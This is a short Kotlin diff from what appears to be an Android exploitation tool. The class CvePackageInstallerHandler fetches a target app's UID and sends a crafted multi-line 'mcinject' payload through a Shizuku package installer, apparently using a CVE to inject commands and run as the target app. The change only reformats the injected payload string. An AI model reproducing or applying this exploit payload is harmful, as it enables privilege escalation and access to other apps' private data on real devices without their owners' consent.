@@ -20,11 +20,8 @@ class CvePackageInstallerHandler(private val context: Context) : InjectionHandle
         val uid = runCatching { context.packageManager.getApplicationInfo(targetPackage, 0).uid }
             .getOrElse { throw RuntimeException("获取目标 UID 失败: ${it.message}", it) }
 
-        val payload = """
-            @null
-            mcinject $uid 1 /data/user/0
-            default:targetSdkVersion=28 none 0 0 1 @null
-        """.trimIndent()
+        val payload = """@null
+mcinject $uid 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null""".trimIndent()
 
         PackageInstallerShizuku.installPackage(apkFile, payload)
             .getOrElse { throw RuntimeException("安装失败: ${it.message}", it) }
